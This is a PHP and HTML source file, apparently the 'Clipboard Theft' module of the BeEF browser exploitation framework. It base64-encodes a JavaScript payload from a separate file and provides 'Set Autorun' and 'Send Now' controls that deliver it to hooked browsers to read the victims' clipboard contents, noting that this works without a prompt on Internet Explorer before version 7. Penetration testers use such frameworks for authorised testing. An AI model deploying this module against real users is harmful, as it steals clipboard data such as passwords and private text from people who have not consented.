<?
	// Copyright (c) 2006-2009, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
?>

<script>
	
	function get_b64_code_cb() {
		// javascript is loaded from a file - it could be hard coded
		var b64code = '<? echo get_b64_file(JS_FILE); ?>';
		
		return b64code;
	}

	Element.Methods.set_autorun = function() {
		ar.enable('Clipboard Theft', get_b64_code_cb());
	}
	
	Element.Methods.send_now = function() {
		do_send(get_b64_code_cb());
	}

	// add construct code to DOM
	Element.addMethods();
	
</script>

<div id="module_header">Clipboard Theft</div>
This module will work automatically with Internet Explorer browsers before 7.x. In later 
versions of Internet Explorer, the browser will prompt the user and ask for permission to 
access the clipboard. <br><br>
<div id="module_subsection">
	<form>
		<input class="button" type="button" value=" Set Autorun " onClick="javascript:set_autorun()"/>
		<input class="button" type="button" value=" Send Now " onClick="javascript:send_now()"/>
	</form>
</div>

